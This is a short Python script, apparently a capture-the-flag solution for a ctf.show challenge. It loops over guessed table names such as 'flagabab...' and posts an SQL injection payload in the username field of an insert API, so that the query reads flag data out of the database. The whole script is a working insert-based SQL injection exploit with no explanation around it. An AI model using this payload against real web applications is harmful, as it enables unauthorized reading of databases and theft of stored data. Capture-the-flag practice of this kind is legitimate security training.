import requests
url_insert="http://eec2547a-ab84-41f9-b4df-4ec3af3ec6ea.challenge.ctf.show:8080/api/insert.php"

for v1 in "ab":
    for v2 in "ab":
        for v3 in "ab":
            for v4 in "ab":
                for v5 in "ab":
                    v="flag"+v1+v2+v3+v4+v5
                    data={
                        'username':"1',(select(group_concat(flag))from({})))#".format(v),
                        'password':'1'
                    }
                    r=requests.post(url=url_insert,data=data)






















